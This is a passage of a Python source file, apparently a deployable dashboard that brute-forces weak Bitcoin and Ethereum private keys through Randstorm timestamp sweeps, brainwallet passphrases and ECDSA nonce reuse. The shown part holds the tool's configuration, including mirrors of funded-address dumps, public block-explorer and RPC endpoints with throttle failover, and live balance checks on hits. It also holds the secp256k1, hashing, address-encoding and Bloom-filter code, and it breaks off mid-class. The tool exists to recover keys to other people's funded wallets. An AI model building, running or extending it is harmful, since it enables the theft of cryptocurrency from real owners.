# btc_hunt.py — single-file Bitcoin crack dashboard for Render
"""
BTC Hunt — all viable pre-2015 Bitcoin attacks in one deployable app.

  1. Randstorm  (BitcoinJS-lib v0.1.3, 2011–2015) — timestamp brute force
  2. Brainwallet (SHA256 passphrase)            — wordlist → address
  3. Nonce Reuse (ECDSA, P2PKH/P2WPKH)         — Esplora API → algebra

Dashboard: Flask + short JSON progress polls. Persistent disk at /data.
Dataset: auto-download from public mirrors; source is configurable.

Deploy: gunicorn btc_hunt:app --bind 0.0.0.0:$PORT --timeout 180
"""

import os, sys, io, re, csv, gzip, json, math, time, signal, base64, hmac, html
import unicodedata
import sqlite3, threading, hashlib, struct, argparse
from pathlib import Path
from datetime import datetime, timezone
from collections import defaultdict, OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.request import urlopen, Request
from urllib.parse import urljoin

import requests
from flask import Flask, request, Response, redirect, url_for

# ════════════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════════════
DATA_DIR   = Path(os.environ.get("DISK_PATH", "/data" if os.path.isdir("/data") else "."))
DATA_DIR.mkdir(parents=True, exist_ok=True)

DB_PATH    = DATA_DIR / "btc_hunt.sqlite"
BLOOM_PATH = DATA_DIR / "funded.bloom"
ADDR_GZ    = DATA_DIR / "blockchair.tsv.gz"
RESULTS    = DATA_DIR / "results.json"

# Written while one or more in-memory jobs are running. btc-hunt-update checks
# this file and defers a redeploy instead of restarting the service (which
# would kill the job). Removed at import time in case a previous process died
# without cleaning up.
BUSY_FILE  = DATA_DIR / ".btc-hunt-busy"
# btc-hunt-update uses this to tell a genuinely running job from a marker
# left behind by a worker that was killed or restarted.
BUSY_PID_FILE = DATA_DIR / ".btc-hunt-busy.pid"
try:
    BUSY_FILE.unlink(missing_ok=True)
    BUSY_PID_FILE.unlink(missing_ok=True)
except OSError:
    pass

# Public mirrors of the funded-Bitcoin-address dump. The old fixed URLs are
# dead as of 2026-11-09:
#   * addresses.loyce.club disabled direct /LATEST downloads (bandwidth abuse)
#     and asks users to use torrents; its HTML index still links dated dumps.
#   * 3xpl retired that path (dumps are now per-chain zstd files needing auth)
#   * privatekeys.pw paywalls downloads
# LoyceV's dated balance TSVs are discovered at runtime and tried BEFORE these
# static mirrors: they are the source proven to work from AWS, and they carry
# the balances that DATASET_MIN_BALANCE filters on. Smaller text/hex dumps
# remain fallbacks. Cloudflare may 403 privatekeyfinder.io from EC2 IPs; the
# official source stays last because free downloads are throttled to ~10 kB/s.
# Prepend custom mirrors with DATASET_URLS="https://...,https://..." (comma
# separated), or paste a single URL into the /data page.
_DEFAULT_DATASET_URLS = [
    "https://privatekeyfinder.io/assets/downloads/bitcoin.hex.gz",
    "https://privatekeyfinder.io/assets/downloads/bitcoin.tsv.gz",
    "https://privatekeyfinder.io/assets/downloads/blockchair_bitcoin_addresses_latest.tsv.gz",
    # Official source, but free downloads are throttled to ~10 kB/s without a key.
    "https://gz.blockchair.com/bitcoin/addresses/blockchair_bitcoin_addresses_latest.tsv.gz",
]
_OFFICIAL_DATASET_URL = _DEFAULT_DATASET_URLS[-1]
LOYCE_INDEX = "http://addresses.loyce.club/"
_custom_urls = [u.strip() for u in os.environ.get("DATASET_URLS", "").split(",")
                if u.strip()]
_CUSTOM_DATASET_URLS = list(_custom_urls)
DATASET_URLS = _custom_urls + _DEFAULT_DATASET_URLS


def _env_int(name, default, minimum):
    try:
        return max(minimum, int(os.environ.get(name, default)))
    except (TypeError, ValueError):
        return default


def _env_float(name, default):
    try:
        return float(os.environ.get(name, default))
    except (TypeError, ValueError):
        return default


# A 1.47 GB / ~51M-row text dump can exceed 30 minutes on a small CPU after
# the download. Keep the network budget tight, but let the two
# streaming parse passes breathe. Both are configurable in /etc/btc-hunt.env.
DOWNLOAD_DEADLINE_SECS = _env_int("DOWNLOAD_DEADLINE_SECS", 1800, 300)
BUILD_DEADLINE_SECS = _env_int("BUILD_DEADLINE_SECS", 7200, 600)
if BUILD_DEADLINE_SECS < DOWNLOAD_DEADLINE_SECS:
    BUILD_DEADLINE_SECS = DOWNLOAD_DEADLINE_SECS
# Trusted public dumps do not need a Base58Check checksum hash per row. Set to
# 1/true/yes/on to verify every checksum (slower) for untrusted custom files.
DATASET_VERIFY_CHECKSUM = os.environ.get(
    "DATASET_VERIFY_CHECKSUM", "").strip().lower() in ("1", "true", "yes", "on")
# Skip TSV rows whose balance is <= this value. Default 0 removes zero and
# negative balances from balance dumps; -1 disables filtering entirely (useful
# for text-only address lists, which have no balance column anyway).
DATASET_MIN_BALANCE = _env_float("DATASET_MIN_BALANCE", 0.0)
# Prefer LoyceV's dated balance TSVs over the smaller text-only dumps so the
# balance filter has balances to act on. Set to 0/false/no/off to revert.
DATASET_PREFER_BALANCE_TSV = os.environ.get(
    "DATASET_PREFER_BALANCE_TSV", "1").strip().lower() not in (
        "0", "false", "no", "off")
ESPLORA    = os.environ.get("ESPLORA_URL", "https://blockstream.info/api")
# blockstream.info answered HTTP 429 to a mere 149-address verify pass, and
# ESPLORA_URLS used to default to that one URL — so "rotation" rotated from
# blockstream.info to blockstream.info. The default is now TWO mainnet bases:
# each keeps its own cooldown deadline and requests fail over to the next
# base that is still answering. Set ESPLORA_URLS to override the list
# entirely (comma-separated, MAINNET only — the address list is mainnet).
_ESPLORA_FALLBACK = "https://mempool.space/api"


def _esplora_base_list():
    raw = os.environ.get("ESPLORA_URLS", "").strip() or \
        f"{ESPLORA},{_ESPLORA_FALLBACK}"
    out = []
    for u in raw.split(","):
        u = u.strip().rstrip("/")
        if u and u not in out:
            out.append(u)
    return out or [ESPLORA]


_ESPLORA_BASES = _esplora_base_list()
# Politeness limits for bulk nonce scans against public Esplora instances.
# 0.15 s was too fast: ~750 requests (29 addresses x ~26 calls) triggered a
# 429 that then persisted for the rest of a 3,000-address run.
ESPLORA_MIN_INTERVAL     = max(0.0, _env_float("ESPLORA_MIN_INTERVAL", 0.3))
ESPLORA_MAX_RETRIES      = _env_int("ESPLORA_MAX_RETRIES", 2, 0)
ESPLORA_CACHE_SIZE       = _env_int("ESPLORA_CACHE_SIZE", 4096, 0)
ESPLORA_MAX_BACKOFF_SECS = max(1.0, _env_float("ESPLORA_MAX_BACKOFF_SECS", 60))
ESPLORA_PACE_MAX_SECS    = max(0.0, _env_float("ESPLORA_PACE_MAX_SECS", 2))
NONCE_MAX_ADDRESSES      = _env_int("NONCE_MAX_ADDRESSES", 5000, 1)
NONCE_MAX_UPLOAD_BYTES   = _env_int("NONCE_MAX_UPLOAD_BYTES", 2_000_000, 1024)
NONCE_RETRY_FILE         = "nonce_retry.txt"
# Bloom false-positive rate. 0.001 gave ~12,000 spurious ★★★ HITs per 4M
# timestamps x 3 derived addresses; 1e-6 cuts that to ~12. A smaller rate
# needs a bigger bitset (~90 MB -> ~183 MB for 51M rows) and more hash rounds.
BLOOM_FP_RATE = min(0.5, max(1e-12, _env_float("BLOOM_FP_RATE", 1e-6)))
# Cap on unique addresses checked by one /api/verify run.
VERIFY_MAX_ADDRESSES = _env_int("VERIFY_MAX_ADDRESSES", 5000, 1)
# Extra passes over addresses that were still throttled (HTTP 429) when a
# verify pass ended. 0 means one pass only. Whatever is still throttled after
# the last pass stays "not checked yet" instead of being stored as an error.
VERIFY_RETRY_PASSES = _env_int("VERIFY_RETRY_PASSES", 3, 0)
# Live-verify every Bloom candidate as it is found. Adds one paced Esplora
# request per candidate, but stops 0-BTC false positives reaching /results.
# Set 0 for the old "save candidate, verify later" mode.
AUTO_VERIFY_HITS = os.environ.get(
    "AUTO_VERIFY_HITS", "1").strip().lower() not in ("0", "false", "no", "off")
# Minimum combined chain+mempool sats required to save a hit. Default 1 skips
# zero-balance candidates; 0 keeps them with balance fields attached.
AUTO_VERIFY_MIN_SATS = _env_int("AUTO_VERIFY_MIN_SATS", 1, 0)
# Automatic Randstorm chunking. The UI accepts larger ranges and the job splits
# them into sequential chunks, so one run cannot lock the dashboard forever.
# 4,000,000,000 ms is ~46.3 days of timestamps = 800 default chunks. Stop is
# honoured between and inside chunks, so a run that long can be abandoned at
# any point and still keeps every hit it found.
# Rate used only for the "this will take about N" note on huge ranges. It is
# the measured randstorm throughput with libsecp256k1 on one vCPU; the real rate
# in the job log is always the measured one.
RANDSTORM_RATE          = max(1, _env_int("RANDSTORM_RATE", 6_000, 1))
RANDSTORM_MAX_MS        = max(1000, _env_int("RANDSTORM_MAX_MS", 5_000_000, 1000))
RANDSTORM_MAX_TOTAL_MS  = max(RANDSTORM_MAX_MS,
                              _env_int("RANDSTORM_MAX_TOTAL_MS",
                                       4_000_000_000, 1000))
_MS_PER_DAY = 86_400_000

# ── Ethereum scanning ──────────────────────────────────────────────────────
# Ethereum uses the same curve (secp256k1) but a different address hash
# (Keccak-256) and has no local dataset: there is no bloom filter to probe, so
# every derived candidate is checked live over JSON-RPC. That only works
# because the requests are BATCHED (ETH_RPC_BATCH calls per HTTP POST).
# Public MAINNET endpoints; set ETH_RPC_URLS to use your own node.
# Public, keyless, rate-limited — and all of them reject datacenter traffic at
# will. 1rpc.io/eth returned HTTP 403 from an EC2 host in ap-south-1 and
# eth.llamarpc.com 525/403 in Oct 2026 measurements, so neither ships here any
# more. That is exactly why every job starts with a pre-flight probe
# (ETH_PREFLIGHT) and why 401/403 parks an endpoint instead of being retried:
# the only reliable answer for a real sweep is ETH_RPC_URLS pointing at your own
# node. "Test RPC" on /eth (POST /api/eth/ping) shows what answers from a host.
ETH_RPC_URLS_DEFAULT = ("https://ethereum-rpc.publicnode.com,"
                        "https://eth.drpc.org,"
                        "https://rpc.flashbots.net,"
                        "https://ethereum.blockpi.network/v1/rpc/public")
_ETH_RPC_BASES = [u.strip().rstrip("/") for u in
                  os.environ.get("ETH_RPC_URLS", ETH_RPC_URLS_DEFAULT).split(",")
                  if u.strip()] or [u.strip().rstrip("/")
                                    for u in ETH_RPC_URLS_DEFAULT.split(",")]
ETH_RPC_BATCH   = _env_int("ETH_RPC_BATCH", 50, 1)
ETH_RPC_TIMEOUT = max(1.0, _env_float("ETH_RPC_TIMEOUT", 25))
# Minimum wei to save a hit. 1 (default) skips empty addresses; 0 keeps every
# verified candidate, including never-used ones — a timestamp sweep then writes
# one row per timestamp, so for big runs keep this at 1 rather than lowering it.
# Set ETH_VERIFY_BALANCES=0 to derive without checking: nothing is queried and
# nothing is saved, candidates are only counted as "unchecked".
ETH_MIN_WEI     = _env_int("ETH_MIN_WEI", 1, 0)
ETH_VERIFY_BALANCES = os.environ.get(
    "ETH_VERIFY_BALANCES", "1").strip().lower() not in ("0", "false", "no", "off")
# Probe every endpoint (eth_blockNumber + a small batch) before deriving
# anything, and use only the ones that answer. Cheap insurance: a sweep that
# starts against endpoints which 403 this host wastes hours.
ETH_PREFLIGHT = os.environ.get(
    "ETH_PREFLIGHT", "1").strip().lower() not in ("0", "false", "no", "off")
# A 401/403 is not a rate limit — it means "we will never answer you", so that
# endpoint is parked for much longer than a throttle. Network/5xx errors get the
# short park. Both are per endpoint; the Esplora cooldown table is shared.
ETH_DEAD_COOL_SECS  = max(30.0, _env_float("ETH_DEAD_COOL_SECS", 3600))
ETH_ERROR_COOL_SECS = max(1.0, _env_float("ETH_ERROR_COOL_SECS", 30))
# How many full rounds over the usable endpoints one batch request gets before
# the batch is queued for a later re-check instead of blocking the sweep.
ETH_RPC_ROUNDS      = _env_int("ETH_RPC_ROUNDS", 3, 1)
# Candidates whose batch could not be checked are appended to this JSONL file on
# the data disk (like nonce_retry.txt for the Bitcoin side) instead of being
# thrown away — deriving one costs up to ~2.7 ms, so a dropped candidate is
# wasted work. 0 disables the cap.
ETH_PENDING_FILE    = "eth_pending.jsonl"
ETH_PENDING_MAX     = _env_int("ETH_PENDING_MAX", 200_000, 0)
# Some gateways reject an unidentified client with 403. Override if yours does.
ETH_RPC_USER_AGENT  = os.environ.get("ETH_RPC_USER_AGENT", "").strip()
# Timestamp batching, mirroring RANDSTORM_MAX_MS / RANDSTORM_MAX_TOTAL_MS.
# ETH_MAX_STEPS is the BATCH SIZE: every sweep, however large, is split into
# batches of at most this many timestamps and the batches run one after another.
# ETH_MAX_TOTAL_STEPS is only a WARN THRESHOLD — nothing is refused any more,
# but past it the reply and the log spell out the batch count and the wall-clock
# time, because "63 billion steps" reads as a number rather than as a month.
# One "step" is one timestamp in the selected unit (ms or s).
# Measured sha256_dec candidates/s with both accelerators on one vCPU; used only
# for the "≈N days" note on huge ranges. The job log always shows the real rate.
ETH_RATE            = max(1, _env_int("ETH_RATE", 24_000, 1))
ETH_MAX_STEPS       = max(1000, _env_int("ETH_MAX_STEPS", 5_000_000, 1000))
ETH_MAX_TOTAL_STEPS = max(ETH_MAX_STEPS,
                          _env_int("ETH_MAX_TOTAL_STEPS", 20_000_000, 1000))
ETH_MAX_WEAK_KEYS   = _env_int("ETH_MAX_WEAK_KEYS", 2_000_000, 1)
# Default slice of each era taken by one "Era batch" run. The era windows are
# billions of timestamps wide (Era 3 alone is 63 billion ms), so a batch run
# sweeps this many steps from the start of each selected era — or from
# `offset` steps in, which is how a run is resumed after a Stop.
ETH_ERA_STEPS       = max(1000, _env_int("ETH_ERA_STEPS", 1_000_000, 1000))
# BIP-39 English wordlist (vendored from bitcoin/bips, sha256 2f5eed53…).
BIP39_WORDLIST_PATH = Path(os.environ.get(
    "BIP39_WORDLIST_PATH",
    str(Path(__file__).resolve().parent / "data" / "bip39_english.txt")))
PORT       = int(os.environ.get("PORT", 5000))
GENESIS_TS = 1293840000000  # 2011-01-01 ms
CUTOFF_TS  = 1420070400000  # 2015-01-01 ms

# Visible build marker: tells you whether the running process is actually the
# commit currently on main. Override with BTC_HUNT_BUILD_ID on platforms that
# ship without a .git directory (e.g. a build from a tarball).
#
# Read .git/HEAD directly instead of shelling out to `git`: the systemd unit
# runs as the unprivileged btc-hunt user while /opt/btc-hunt is root-owned, so
# `git rev-parse` reports "dubious ownership" and the build id came back as
# "unknown" on EC2. Reading the files needs no git binary and no ownership
# check. `base_dir` exists so this is testable without creating a real repo.
def _detect_build_id(base_dir=None):
    forced = os.environ.get("BTC_HUNT_BUILD_ID", "").strip()
    if forced:
        return forced
    try:
        here = Path(base_dir) if base_dir else Path(__file__).resolve().parent
        git_dir = here / ".git"
        if git_dir.is_file():          # linked worktree / submodule
            line = git_dir.read_text().strip()
            if line.startswith("gitdir:"):
                git_dir = Path(line[7:].strip())
                if not git_dir.is_absolute():
                    git_dir = (here / git_dir).resolve()
        head = (git_dir / "HEAD").read_text(encoding="utf-8").strip()
        if head.startswith("ref: "):
            ref_name = head[5:].strip()
            ref = git_dir / ref_name
            if ref.exists():
                return ref.read_text(encoding="utf-8").strip()[:7]
            packed = git_dir / "packed-refs"
            if packed.exists():
                for line in packed.read_text(encoding="utf-8").splitlines():
                    if line.startswith("#") or line.startswith("^"):
                        continue
                    parts = line.split()
                    if len(parts) == 2 and parts[1] == ref_name:
                        return parts[0][:7]
        elif re.fullmatch(r"[0-9a-fA-F]{7,40}", head):
            return head[:7]           # detached HEAD
    except (OSError, ValueError):
        pass
    return "unknown"

BUILD_ID = _detect_build_id()
STARTED_AT = datetime.now(timezone.utc).isoformat(timespec="seconds")

# secp256k1
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8


# ════════════════════════════════════════════════════════════════════
# CRYPTO PRIMITIVES
# ════════════════════════════════════════════════════════════════════
def _affine_add(p, q):
    if p is None: return q
    if q is None: return p
    x1,y1 = p; x2,y2 = q
    if x1==x2 and (y1+y2)%P==0: return None
    if p==q:
        lam=(3*x1*x1)*pow(2*y1,-1,P)%P
    else:
        lam=(y2-y1)*pow(x2-x1,-1,P)%P
    x3=(lam*lam-x1-x2)%P
    return (x3,(lam*(x1-x3)-y1)%P)

# ── secp256k1 scalar multiplication ──────────────────────────────────────
# The attack loops derive one point per timestamp/passphrase, so this is the
# hot path — and it used to run TWICE per key (once for the compressed pubkey,
# once for the uncompressed one), each time with a modular inversion per step.
# Measured over 200 random scalars on one vCPU:
#
#   affine double-and-add, inversion per step (old)   6,012 us/key    1.0x
#   Jacobian double-and-add                           1,665 us/key    3.6x
#   Jacobian + precomputed fixed-base window (w=4)      427 us/key     14x
#   libsecp256k1 via coincurve                           25 us/key    244x
#
# coincurve is used when importable (see requirements-fast.txt); otherwise the
# windowed pure-Python path runs. EC_BACKEND=libsecp256k1|python forces one.
# All of them return the same points — the tests compare every backend against
# _ec_mul_affine below.
_JAC_INF = (0, 0, 0)
_EC_WINDOW = 4                 # 256/4 = 64 digits, 16 table entries each
_EC_TABLE = None               # lazily built: [64][16] Jacobian points
_EC_TABLE_LOCK = threading.Lock()

try:                                   # optional native dependency
    import coincurve as _coincurve
    _CoincurvePublicKey = _coincurve.PublicKey
except Exception:                      # ImportError or a broken libsecp256k1
    _coincurve = None
    _CoincurvePublicKey = None

EC_BACKEND_PREF = os.environ.get("EC_BACKEND", "auto").strip().lower()


def _j_double(X1, Y1, Z1):
    if Y1 == 0 or Z1 == 0:
        return _JAC_INF
    YY = (Y1 * Y1) % P
    S = (4 * X1 * YY) % P
    M = (3 * X1 * X1) % P              # secp256k1 has a = 0
    X2 = (M * M - 2 * S) % P
    Y2 = (M * (S - X2) - 8 * YY * YY) % P
    Z2 = (2 * Y1 * Z1) % P
    return (X2, Y2, Z2)


def _j_add(p, q):
    X1, Y1, Z1 = p
    X2, Y2, Z2 = q
    if Z1 == 0: return q
    if Z2 == 0: return p
    Z1Z1 = (Z1 * Z1) % P
    Z2Z2 = (Z2 * Z2) % P
    U1 = (X1 * Z2Z2) % P
    U2 = (X2 * Z1Z1) % P
    S1 = (Y1 * Z2 % P * Z2Z2) % P
    S2 = (Y2 * Z1 % P * Z1Z1) % P
    if U1 == U2:
        return _j_double(X1, Y1, Z1) if S1 == S2 else _JAC_INF
    H = (U2 - U1) % P
    I = (4 * H * H) % P
    J = (H * I) % P
    r = (2 * (S2 - S1)) % P
    V = (U1 * I) % P
    X3 = (r * r - J - 2 * V) % P
    Y3 = (r * (V - X3) - 2 * S1 * J) % P
    Z3 = (((Z1 + Z2) * (Z1 + Z2) - Z1Z1 - Z2Z2) % P * H) % P
    return (X3, Y3, Z3)


def _j_to_affine(p):
    X, Y, Z = p
    if Z == 0:
        return None
    Zi = pow(Z, -1, P)                 # the ONLY inversion per scalar mult
    Zi2 = (Zi * Zi) % P
    Zi3 = (Zi2 * Zi) % P
    return ((X * Zi2) % P, (Y * Zi3) % P)


def _ec_table():
    """T[i][d] = d * 16**i * G in Jacobian form. Built once, ~7 ms."""
    global _EC_TABLE
    with _EC_TABLE_LOCK:
        if _EC_TABLE is not None:
            return _EC_TABLE
        table = []
        base = (Gx, Gy, 1)
        for _ in range(256 // _EC_WINDOW):
            row = [_JAC_INF]
            cur = _JAC_INF
            for d in range(1, 1 << _EC_WINDOW):
                cur = base if d == 1 else _j_add(cur, base)
                row.append(cur)
            table.append(row)
            for _ in range(_EC_WINDOW):
                base = _j_double(*base)
        _EC_TABLE = table
        return table


def _ec_mul_windowed(k):
    """k*G via the fixed-base table: ~64 additions and one inversion."""
    k %= N
    if k == 0:
        return None
    acc = _JAC_INF
    mask = (1 << _EC_WINDOW) - 1
    table = _ec_table()
    for i in range(256 // _EC_WINDOW):
        d = (k >> (_EC_WINDOW * i)) & mask
        if d:
            acc = _j_add(acc, table[i][d])
    return _j_to_affine(acc)


def _ec_mul_secp256k1(k):
    """k*G through libsecp256k1. Returns (x, y) or None."""
    k %= N
    if k == 0:
        return None
    raw = _CoincurvePublicKey.from_secret(
        k.to_bytes(32, "big")).format(compressed=False)
    return (int.from_bytes(raw[1:33], "big"), int.from_bytes(raw[33:65], "big"))


_PY_LABEL = "python windowed w=%d" % _EC_WINDOW


def _select_ec_backend():
    if EC_BACKEND_PREF in ("python", "pure", "pure-python", "fallback"):
        return _ec_mul_windowed, _PY_LABEL
    if _CoincurvePublicKey is not None:
        return (_ec_mul_secp256k1,
                "libsecp256k1 (coincurve %s)"
                % getattr(_coincurve, "__version__", "?"))
    if EC_BACKEND_PREF in ("libsecp256k1", "coincurve", "secp256k1", "native"):
        return _ec_mul_windowed, _PY_LABEL + " (coincurve unavailable)"
    return _ec_mul_windowed, _PY_LABEL


_ec_point, EC_BACKEND = _select_ec_backend()


def ec_mul(k, pt=(Gx, Gy)):
    """k*pt for an arbitrary point (nonce recovery uses non-generator bases)."""
    if k==0 or pt is None: return None
    if pt[0] == Gx and pt[1] == Gy:
        return _ec_point(k)
    k%=N; acc=_JAC_INF; g=(pt[0], pt[1], 1)
    while k:
        if k&1: acc=_j_add(acc, g)
        g=_j_double(*g); k>>=1
    return _j_to_affine(acc)


def _ec_mul_affine(k, pt=(Gx, Gy)):
    """Slow affine reference implementation — kept for tests."""
    if k==0 or pt is None: return None
    k%=N; acc=None; g=pt
    while k:
        if k&1: acc=_affine_add(acc,g)
        g=_affine_add(g,g); k>>=1
    return acc


def pubkey_point(d):
    """The single EC multiplication shared by every encoding of this key."""
    return _ec_point(d)


def derive_pubkeys(d):
    """(compressed_pub, uncompressed_pub) or None — ONE EC multiplication."""
    pt = pubkey_point(d)
    if pt is None:
        return None
    x, y = pt
    xb = x.to_bytes(32, "big")
    return (bytes([2 + (y & 1)]) + xb, b"\x04" + xb + y.to_bytes(32, "big"))


def privkey_to_compressed_pub(d):
    pubs = derive_pubkeys(d)
    return pubs[0] if pubs else None


def privkey_to_uncompressed_pub(d):
    pubs = derive_pubkeys(d)
    return pubs[1] if pubs else None

def sha256(b): return hashlib.sha256(b).digest()
def sha256d(b): return sha256(sha256(b))
def ripemd160(b):
    # OpenSSL 3 builds without the legacy provider raise ValueError here
    # (a known problem on some native-Python PaaS images).
    try:
        h=hashlib.new('ripemd160'); h.update(b); return h.digest()
    except (ValueError, TypeError):
        return _ripemd160_py(b)


def _ripemd160_py(msg):
    # Pure-Python RIPEMD160, used only if hashlib cannot provide it.
    h = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0]
    rl = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,
          7,4,13,1,10,6,15,3,12,0,9,5,2,14,11,8,
          3,10,14,4,9,15,8,1,2,7,0,6,13,11,5,12,
          1,9,11,10,0,8,12,4,13,3,7,15,14,5,6,2,
          4,0,5,9,7,12,2,10,14,1,3,8,11,6,15,13]
    rr = [5,14,7,0,9,2,11,4,13,6,15,8,1,10,3,12,
          6,11,3,7,0,13,5,10,14,15,8,12,4,9,1,2,
          15,5,1,3,7,14,6,9,11,8,12,2,10,0,4,13,
          8,6,4,1,3,11,15,0,5,12,2,13,9,7,10,14,
          12,15,10,4,1,5,8,7,6,2,13,14,0,3,9,11]
    sl = [11,14,15,12,5,8,7,9,11,13,14,15,6,7,9,8,
          7,6,8,13,11,9,7,15,7,12,15,9,11,7,13,12,
          11,13,6,7,14,9,13,15,14,8,13,6,5,12,7,5,
          11,12,14,15,14,15,9,8,9,14,5,6,8,6,5,12,
          9,15,5,11,6,8,13,12,5,12,13,14,11,8,5,6]
    sr = [8,9,9,11,13,15,15,5,7,7,8,11,14,14,12,6,
          9,13,15,7,12,8,9,11,7,7,12,7,6,15,13,11,
          9,7,15,11,8,6,6,14,12,13,5,14,13,13,7,5,
          15,5,8,11,14,14,6,14,6,9,12,9,12,5,15,8,
          8,5,12,9,12,5,14,6,8,13,6,5,15,13,11,11]
    kl = (0x00000000, 0x5A827999, 0x6ED9EBA1, 0x8F1BBCDC, 0xA953FD4E)
    kr = (0x50A28BE6, 0x5C4DD124, 0x6D703EF3, 0x7A6D76E9, 0x00000000)
    MASK = 0xFFFFFFFF

    def rol(x, n):
        return ((x << n) | (x >> (32 - n))) & MASK

    def f(j, x, y, z):
        if j < 16: return x ^ y ^ z
        if j < 32: return (x & y) | (~x & z)
        if j < 48: return (x | ~y) ^ z
        if j < 64: return (x & z) | (y & ~z)
        return x ^ (y | ~z)

    data = bytes(msg)
    bitlen = (len(data) * 8) & 0xFFFFFFFFFFFFFFFF
    data += b'\x80' + b'\x00' * ((55 - len(data)) % 64) + bitlen.to_bytes(8, 'little')
    for off in range(0, len(data), 64):
        X = [int.from_bytes(data[off+4*i:off+4*i+4], 'little') for i in range(16)]
        al, bl, cl, dl, el = h
        ar, br, cr, dr, er = h
        for j in range(80):
            t = (rol((al + f(j, bl, cl, dl) + X[rl[j]] + kl[j // 16]) & MASK, sl[j]) + el) & MASK
            al, bl, cl, dl, el = el, t, bl, rol(cl, 10), dl
            t = (rol((ar + f(79 - j, br, cr, dr) + X[rr[j]] + kr[j // 16]) & MASK, sr[j]) + er) & MASK
            ar, br, cr, dr, er = er, t, br, rol(cr, 10), dr
        t = (h[1] + cl + dr) & MASK
        h[1] = (h[2] + dl + er) & MASK
        h[2] = (h[3] + el + ar) & MASK
        h[3] = (h[4] + al + br) & MASK
        h[4] = (h[0] + bl + cr) & MASK
        h[0] = t
    return b''.join(x.to_bytes(4, 'little') for x in h)

def hash160(b): return ripemd160(sha256(b))

# Base58Check
B58='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
B58_MAP = {c: i for i, c in enumerate(B58)}
def b58encode(b):
    n=int.from_bytes(b,'big'); out=''
    while n: n,r=divmod(n,58); out=B58[r]+out
    for x in b:
        if x==0: out='1'+out
        else: break
    return out

def b58check(payload):
    return b58encode(payload+sha256d(payload)[:4])

def p2pkh_address(pubkey, compressed=True):
    h=hash160(pubkey)
    return b58check(b'\x00'+h)

# Bech32
BECH32='qpzry9x8gf2tvdw0s3jn54khce6mua7l'
BECH32_MAP = {c: i for i, c in enumerate(BECH32)}
def _bech32_polymod(v):
    G=[0x3b6a57b2,0x26508e6d,0x1ea119fa,0x3d4233dd,0x2a1462b3]; chk=1
    for x in v:
        b=chk>>25; chk=(chk&0x1ffffff)<<5^x
        for i in range(5):
            if (b>>i)&1: chk^=G[i]
    return chk
def _bech32_hrp_expand(hrp): return [ord(x)>>5 for x in hrp]+[0]+[ord(x)&31 for x in hrp]
def _bech32_create_checksum(hrp,data):
    values=_bech32_hrp_expand(hrp)+data
    polymod=_bech32_polymod(values+[0]*6)^1
    return [(polymod>>5*(5-i))&31 for i in range(6)]
def _convertbits(data,frombits,tobits,pad=True):
    acc=0; bits=0; ret=[]; maxv=(1<<tobits)-1
    for v in data:
        acc=(acc<<frombits)|v; bits+=frombits
        while bits>=tobits:
            bits-=tobits; ret.append((acc>>bits)&maxv)
    if pad and bits: ret.append((acc<<(tobits-bits))&maxv)
    return ret
def p2wpkh_address(pubkey_compressed, hrp='bc'):
    h=hash160(pubkey_compressed)
    data=[0]+_convertbits(h,8,5)
    checksum=_bech32_create_checksum(hrp,data)
    return hrp+'1'+''.join(BECH32[d] for d in data+checksum)

def derive_addresses(privkey):
    """Return list of (label, address) for all common Bitcoin address types."""
    out=[]
    try:
        pubs=derive_pubkeys(privkey)
    except Exception:
        return out
    if not pubs:
        return out
    cpub, upub = pubs
    out.append(('p2pkh_c', p2pkh_address(cpub, True)))
    out.append(('p2wpkh', p2wpkh_address(cpub)))
    out.append(('p2pkh_u', p2pkh_address(upub, False)))
    return out


# The attack loops only need hash160(pubkey) to probe the bloom filter; the
# base58/bech32 string is only needed for a candidate that actually matched.
# Encoding three addresses and then decoding them again with
# _address_to_hash160() cost ~0.15 ms per timestamp on the ~100% of keys that
# miss the filter.
def derive_candidates(privkey):
    """Yield (label, hash160, pubkey) — no address strings, no decoding."""
    try:
        pubs = derive_pubkeys(privkey)
    except Exception:
        return
    if not pubs:
        return
    cpub, upub = pubs
    hc = hash160(cpub)
    yield ('p2pkh_c', hc, cpub)
    yield ('p2wpkh', hc, cpub)
    yield ('p2pkh_u', hash160(upub), upub)


def encode_address(label, pubkey):
    """Materialise the address string for a candidate that matched the filter."""
    if label == 'p2wpkh':
        return p2wpkh_address(pubkey)
    return p2pkh_address(pubkey, label != 'p2pkh_u')


# ════════════════════════════════════════════════════════════════════
# BLOOM FILTER
# ════════════════════════════════════════════════════════════════════
class BloomFilter:
    """Bit-array bloom over hash160 values with double hashing."""
    def __init__(self, m_bits, k):
        self.m = m_bits
        self.k = k
        self.bits = bytearray((m_bits + 7) // 8)

    @classmethod
    def create(cls, n_items, fp_rate=None):
        # `None` picks the configured BLOOM_FP_RATE; an explicit value is still
        # honoured (tests, callers that want a different precision).
        p = BLOOM_FP_RATE if fp_rate is None else fp_rate
        p = min(0.5, max(1e-12, float(p)))
        m = int(-n_items * math.log(p) / (math.log(2) ** 2))
        m = (m + 7) // 8 * 8
        k = max(1, int((m / max(n_items, 1)) * math.log(2)))
        return cls(m, k)

    def _positions(self, h160):
        h = hashlib.sha256(h160).digest()
        h1 = int.from_bytes(h[:8], 'big')
        h2 = int.from_bytes(h[8:16], 'big')
        for i in range(self.k):
            yield (h1 + i * h2) % self.m

    def add(self, h160):
        # Inlined hot path: 51M rows × k positions, avoid a generator per row.
        h = hashlib.sha256(h160).digest()
        h1 = int.from_bytes(h[:8], 'big')
        h2 = int.from_bytes(h[8:16], 'big')
        m, k, bits = self.m, self.k, self.bits
        for i in range(k):
            pos = (h1 + i * h2) % m
            bits[pos >> 3] |= 1 << (pos & 7)

    def __contains__(self, h160):
        for pos in self._positions(h160):
            if not self.bits[pos >> 3] & (1 << (pos & 7)):
                return False
        return True

    def save(self, path):
